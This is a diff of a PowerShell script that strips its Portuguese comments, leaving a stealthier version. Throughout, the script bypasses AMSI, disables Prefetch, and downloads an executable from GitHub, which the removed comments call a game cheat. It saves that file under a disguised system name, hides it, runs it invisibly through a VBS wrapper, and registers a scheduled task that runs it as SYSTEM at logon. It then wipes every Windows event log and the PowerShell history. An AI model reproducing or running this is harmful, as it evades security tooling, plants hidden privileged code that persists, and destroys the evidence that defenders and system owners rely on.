@@ -1,37 +1,24 @@
-# 1. Bypass AMSI
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-# 2. Desativa Prefetch
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
 
-# 3. Baixa o cheat e esconde na pasta do Windows
 $url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
 $path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
+
 (New-Object System.Net.WebClient).DownloadFile($url, $path)
 Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
 
-# 4. Cria o script VBS para rodar invisível (Janela 0)
-$vbsPath = "$env:TEMP\sync.vbs"
+$vbsPath = "$env:TEMP\sys_update.vbs"
 "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"`"$path`"`"`", 0, False" | Out-File -FilePath $vbsPath -Encoding ASCII
-
-# 5. Inicia o cheat invisível
 Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
 
-# 6. Persistência (Agendador de Tarefas rodando como SYSTEM no logon)
-$taskName = "WindowsSyncSystem"
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
+Register-ScheduledTask -TaskName "WindowsSyncSystem" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
 
-# 7. Restaura Prefetch
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
 
-# 8. LIMPEZA TOTAL (Apaga TODOS os logs do Windows e do Event Viewer)
 Start-Sleep -Seconds 1
-# Pega a lista de todos os logs e limpa um por um
 $logs = wevtutil el
 foreach ($log in $logs) { wevtutil cl "$log" 2>$null }
-
-# Limpa o histórico do PowerShell
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
